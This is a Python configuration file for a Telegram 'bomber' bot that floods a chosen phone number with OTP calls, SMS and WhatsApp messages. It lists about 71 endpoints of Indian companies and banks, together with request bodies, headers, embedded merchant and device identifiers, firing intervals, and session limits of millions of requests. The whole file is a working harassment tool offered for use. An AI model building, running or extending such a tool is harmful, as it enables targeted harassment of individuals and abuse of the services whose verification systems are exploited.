# config.py – Final Configuration for Advanced Telegram Bomber Bot
import os

# ============================== DATABASE ==============================
DB_FILE = "bot_data.db"

# ============================== BOT ENVIRONMENT ==============================
BOT_TOKEN        = os.getenv("BOT_TOKEN")
OWNER_ID         = int(os.getenv("OWNER_ID", "0"))
PORT             = int(os.getenv("PORT", 10000))
WEBHOOK_BASE     = os.getenv("RENDER_EXTERNAL_URL")   # Render sets this automatically

# ============================== BRANDING ==============================
BRANDING = "\n\n🤖 <b>Powered by NULL PROTOCOL</b>"

# ============================== BOMBING DEFAULTS ==============================
DEFAULT_COUNTRY_CODE = "91"

DEFAULT_CALL_INTERVAL = 25    # seconds between successive CALL API hits
DEFAULT_SMS_INTERVAL   = 5    # seconds between SMS/WhatsApp rounds

MIN_CALL_INTERVAL = 10
MIN_SMS_INTERVAL  = 2
MAX_INTERVAL      = 120

AUTO_STOP_SECONDS   = 20 * 60   # 20 minutes per session
MAX_REQUEST_LIMIT   = 9_000_000 # soft limit per session
TELEGRAM_RATE_LIMIT = 5         # minimum seconds between status updates

# ============================== 71 APIs ====================================
# CALL APIs (7) – hit one by one every call_interval seconds
# SMS / WHATSAPP APIs (64) – fired together every sms_interval seconds
BOMBER_APIS = [

    # ----------------- CALL APIs (7) ------------------
    {
        "name": "GauravCyber Call",
        "type": "CALL",
        "url": "https://bomm.gauravcyber0.workers.dev/?phone={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "Swiggy Call",
        "type": "CALL",
        "url": "https://profile.swiggy.com/api/v3/app/request_call_verification",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": '{"mobile":"{phone}"}'
    },
    {
        "name": "Tata Capital 1",
        "type": "CALL",
        "url": "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": '{"phone":"{phone}","isOtpViaCallAtLogin":"true"}'
    },
    {
        "name": "Tata Capital 2",
        "type": "CALL",
        "url": "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": '{"phone":"{phone}","isOtpViaCallAtLogin":"true"}'
    },
    {
        "name": "MakeMyTrip Voice",
        "type": "CALL",
        "url": "https://www.makemytrip.com/api/4/voice-otp/generate",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": '{"phone":"{phone}"}'
    },
    {
        "name": "Goibibo Voice 1",
        "type": "CALL",
        "url": "https://www.goibibo.com/user/voice-otp/generate/",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": '{"phone":"{phone}"}'
    },
    {
        "name": "Goibibo Voice 2",
        "type": "CALL",
        "url": "https://www.goibibo.com/user/voice-otp/generate/",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": '{"phone":"{phone}"}'
    },

    # ----------------- SMS / WHATSAPP APIs (64) ------------------
    {
        "name": "OYO Rooms",
        "type": "SMS",
        "url": "https://www.oyorooms.com/api/pwa/generateotp?country_code=%2B91&nod=4&phone={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "Delhivery",
        "type": "SMS",
        "url": "https://direct.delhivery.com/delhiverydirect/order/generate-otp?phoneNo={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "PharmEasy",
        "type": "SMS",
        "url": "https://pharmeasy.in/api/auth/requestOTP",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": '{"contactNumber":"{phone}"}'
    },
    {
        "name": "Flipkart",
        "type": "SMS",
        "url": "https://www.flipkart.com/api/6/user/signup/status",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": '{"loginId":["+91{phone}"]}'
    },
    {
        "name": "Practo",
        "type": "SMS",
        "url": "https://accounts.practo.com/send_otp",
        "method": "POST",
        "headers": {
            "client-name": "Practo Android App",
            "Content-Type": "application/x-www-form-urlencoded"
        },
        "data": "mobile=+91{phone}"
    },
    {
        "name": "Goibibo SMS",
        "type": "SMS",
        "url": "https://www.goibibo.com/common/downloadsms/",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": "mbl={phone}"
    },
    {
        "name": "Apollo Pharmacy",
        "type": "SMS",
        "url": "https://www.apollopharmacy.in/sociallogin/mobile/sendotp/",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": "mobile={phone}"
    },
    # --- Gokwik based (tokens may expire, replace with fresh ones) ---
    {
        "name": "GheeAPI (Gokwik)",
        "type": "SMS",
        "url": "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send",
        "method": "POST",
        "headers": {
            "Authorization": "Bearer YOUR_JWT_HERE",        # <-- Replace with valid token
            "gk-merchant-id": "19g6im8srkz9y",
            "Content-Type": "application/json"
        },
        "data": '{"phone":"{phone}","country":"IN"}'
    },
    {
        "name": "EdzAPI (Gokwik)",
        "type": "SMS",
        "url": "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send",
        "method": "POST",
        "headers": {
            "Authorization": "Bearer YOUR_JWT_HERE",
            "gk-merchant-id": "19an4fq2kk5y",
            "Content-Type": "application/json"
        },
        "data": '{"phone":"{phone}","country":"IN"}'
    },
    {
        "name": "FalconAPI (Breeze)",
        "type": "SMS",
        "url": "https://api.breeze.in/session/start",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "x-device-id": "A1pKVEDhlv66KLtoYsml3",
            "x-session-id": "MUUdODRfiL8xmwzhEpjN8"
        },
        "data": '{"phoneNumber":"{phone}","authVerificationType":"otp","device":{"id":"A1pKVEDhlv66KLtoYsml3","platform":"Chrome","type":"Desktop"},"countryCode":"+91"}'
    },
    {
        "name": "KisanAPI (DeHaat)",
        "type": "SMS",
        "url": "https://oidc.agrevolution.in/auth/realms/dehaat/custom/sendOTP",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": '{"mobile_number":"{phone}","client_id":"kisan-app"}'
    },
    {
        "name": "FasiinAPI (Gokwik)",
        "type": "SMS",
        "url": "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send",
        "method": "POST",
        "headers": {
            "Authorization": "Bearer YOUR_JWT_HERE",
            "gk-merchant-id": "19kc37zcdyiu",
            "Content-Type": "application/json"
        },
        "data": '{"phone":"{phone}","country":"IN"}'
    },
    {
        "name": "VidyaKul",
        "type": "SMS",
        "url": "https://vidyakul.com/signup-otp/send",
        "method": "POST",
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded",
            "x-csrf-token": "fu4xrNYdXZbb2oT2iuHvjVtMyDw5WNFaeuyPSu7Q",
            "x-requested-with": "XMLHttpRequest"
        },
        "data": "phone={phone}&rcsconsent=true"
    },
    {
        "name": "Hungama",
        "type": "SMS",
        "url": "https://communication.api.hungama.com/v1/communication/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": '{"mobileNo":"{phone}","countryCode":"+91","appCode":"un"}'
    },
    {
        "name": "Dayco India",
        "type": "SMS",
        "url": "https://ekyc.daycoindia.com/api/nscript_functions.php",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": "api=send_otp&mob={phone}"
    },
    {
        "name": "KPN Fresh",
        "type": "SMS",
        "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=WEB",
        "method": "POST",
        "headers": {"content-type": "application/json"},
        "data": '{"phone_number":{"number":"{phone}","country_code":"+91"}}'
    },
    {
        "name": "Servetel",
        "type": "SMS",
        "url": "https://api.servetel.in/v1/auth/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": "mobile_number={phone}"
    },
    {
        "name": "GoPink Cabs",
        "type": "SMS",
        "url": "https://www.gopinkcabs.com/app/cab/customer/login_admin_code.php",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": "check_mobile_number=1&contact={phone}"
    },
    {
        "name": "Zomato",
        "type": "SMS",
        "url": "https://www.zomato.com/php/asyncLogin.php",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": "phone={phone}"
    },
    {
        "name": "Mobikwik",
        "type": "SMS",
        "url": "https://www.mobikwik.com/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": '{"mobile":"{phone}"}'
    },
    {
        "name": "Airtel Thanks",
        "type": "SMS",
        "url": "https://www.airtel.in/thanks-app/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": '{"mobile":"{phone}"}'
    },
    {
        "name": "DocsApp",
        "type": "SMS",
        "url": "https://www.docsapp.com/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": '{"phone":"{phone}"}'
    },
    # --- Bank APIs (may not deliver real OTPs but work as flooding) ---
    {
        "name": "Axis Bank",
        "type": "SMS",
        "url": "https://www.axisbank.com/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": '{"phone":"{phone}"}'
    },
    {
        "name": "Kotak Bank",
        "type": "SMS",
        "url": "https://www.kotak.com/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": '{"phone":"{phone}"}'
    },
    {
        "name": "IndusInd Bank",
        "type": "SMS",
        "url": "https://www.indusind.com/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": '{"phone":"{phone}"}'
    },
    {
        "name": "Bank of Baroda",
        "type": "SMS",
        "url": "https://www.bankofbaroda.in/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": '{"phone":"{phone}"}'
    },
    {
        "name": "Indian Bank",
        "type": "SMS",
        "url": "https://www.indianbank.in/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": '{"phone":"{phone}"}'
    },
    {
        "name": "IDBI Bank",
        "type": "SMS",
        "url": "https://www.idbibank.com/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": '{"mobile":"{phone}"}'
    },
    {
        "name": "Punjab & Sind Bank",
        "type": "SMS",
        "url": "https://www.psbindia.com/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": '{"phone":"{phone}"}'
    },
    # --- WhatsApp APIs ---
    {
        "name": "KPN WhatsApp",
        "type": "WHATSAPP",
        "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=AND&version=3.2.6",
        "method": "POST",
        "headers": {
            "x-app-id": "66ef3594-1e51-4e15-87c5-05fc8208a20f",
            "content-type": "application/json"
        },
        "data": '{"notification_channel":"WHATSAPP","phone_number":{"country_code":"+91","number":"{phone}"}}'
    },
    {
        "name": "Jockey WhatsApp",
        "type": "WHATSAPP",
        "url": "https://www.jockey.in/apps/jotp/api/login/resend-otp/+91{phone}?whatsapp=true",
        "method": "GET",
        "headers": {},
        "data": None
    },
    # --- Rest SMS APIs ---
    {
        "name": "NoBroker SMS",
        "type": "SMS",
        "url": "https://www.nobroker.in/api/v3/account/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": "phone={phone}&countryCode=IN"
    },
    {
        "name": "Lending Plate",
        "type": "SMS",
        "url": "https://lendingplate.com/api.php",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": "mobiles={phone}&resend=Resend"
    },
    {
        "name": "GoKwik",
        "type": "SMS",
        "url": "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": '{"phone":"{phone}","country":"in"}'
    },
    {
        "name": "Univest",
        "type": "SMS",
        "url": "https://api.univest.in/api/auth/send-otp?type=web4&countryCode=91&contactNumber={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "Smytten",
        "type": "SMS",
        "url": "https://route.smytten.com/discover_user/NewDeviceDetails/addNewOtpCode",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": '{"phone":"{phone}"}'
    },
    {
        "name": "NewMe",
        "type": "SMS",
        "url": "https://prodapi.newme.asia/web/otp/request",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": '{"mobile_number":"{phone}","resend_otp_request":true}'
    },
    {
        "name": "MyHubble Money",
        "type": "SMS",
        "url": "https://api.myhubble.money/v1/auth/otp/generate",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": '{"phoneNumber":"{phone}","channel":"SMS"}'
    },
    {
        "name": "Snapmint",
        "type": "SMS",
        "url": "https://api.snapmint.com/v1/public/sign_up",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": '{"phone":"{phone}"}'
    },
    {
        "name": "Animall",
        "type": "SMS",
        "url": "https://animall.in/zap/auth/login",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": '{"phone":"{phone}","signupPlatform":"NATIVE_ANDROID"}'
    },
    {
        "name": "Entri",
        "type": "SMS",
        "url": "https://entri.app/api/v3/users/check-phone/",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": '{"phone":"{phone}"}'
    },
    {
        "name": "A23 Games",
        "type": "SMS",
        "url": "https://pfapi.a23games.in/a23user/signup_by_mobile_otp/v2",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": '{"mobile":"{phone}","device_id":"android123"}'
    },
    {
        "name": "Lifestyle Stores",
        "type": "SMS",
        "url": "https://www.lifestylestores.com/in/en/mobilelogin/sendOTP",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": '{"signInMobile":"{phone}","channel":"sms"}'
    },
    {
        "name": "WorkIndia",
        "type": "SMS",
        "url": "https://api.workindia.in/api/candidate/profile/login/verify-number/?mobile_no={phone}&version_number=623",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "PokerBaazi",
        "type": "SMS",
        "url": "https://nxtgenapi.pokerbaazi.com/oauth/user/send-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": '{"mobile":"{phone}","mfa_channels":"phno"}'
    },
    {
        "name": "MamaEarth",
        "type": "SMS",
        "url": "https://auth.mamaearth.in/v1/auth/initiate-signup",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": '{"mobile":"{phone}"}'
    },
    {
        "name": "Wellness Forever",
        "type": "SMS",
        "url": "https://paalam.wellnessforever.in/crm/v2/firstRegisterCustomer",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": 'method=firstRegisterApi&data={"customerMobile":"{phone}","generateOtp":"true"}'
    },
    {
        "name": "HealthMug",
        "type": "SMS",
        "url": "https://api.healthmug.com/account/createotp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": '{"mobile":"{phone}"}'
    },
    {
        "name": "Vyapar",
        "type": "SMS",
        "url": "https://vyaparapp.in/api/ftu/v3/send/otp?country_code=91&mobile={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "Moglix",
        "type": "SMS",
        "url": "https://apinew.moglix.com/nodeApi/v1/login/sendOTP",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": '{"mobile":"{phone}","buildVersion":"24.0"}'
    },
    {
        "name": "CodFirm",
        "type": "SMS",
        "url": "https://api.codfirm.in/api/customers/login/otp?medium=sms&phoneNumber=%2B91{phone}&email=&storeUrl=bellavita1.myshopify.com",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "Swipe",
        "type": "SMS",
        "url": "https://app.getswipe.in/api/user/mobile_login",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": '{"mobile":"{phone}","resend":true}'
    },
    {
        "name": "Country Delight",
        "type": "SMS",
        "url": "https://api.countrydelight.in/api/v1/customer/requestOtp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": '{"mobile":"{phone}","platform":"Android"}'
    },
    {
        "name": "AstroSage",
        "type": "SMS",
        "url": "https://vartaapi.astrosage.com/sdk/registerAS?operation_name=signup&countrycode=91&phoneno={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
]

# ============================== FILTERED LISTS ==============================
CALL_APIS = [api for api in BOMBER_APIS if api["type"] == "CALL"]
SMS_APIS  = [api for api in BOMBER_APIS if api["type"] in ("SMS", "WHATSAPP")]

# Optional: print counts at startup
# print(f"Loaded {len(CALL_APIS)} call APIs and {len(SMS_APIS)} SMS/WhatsApp APIs")
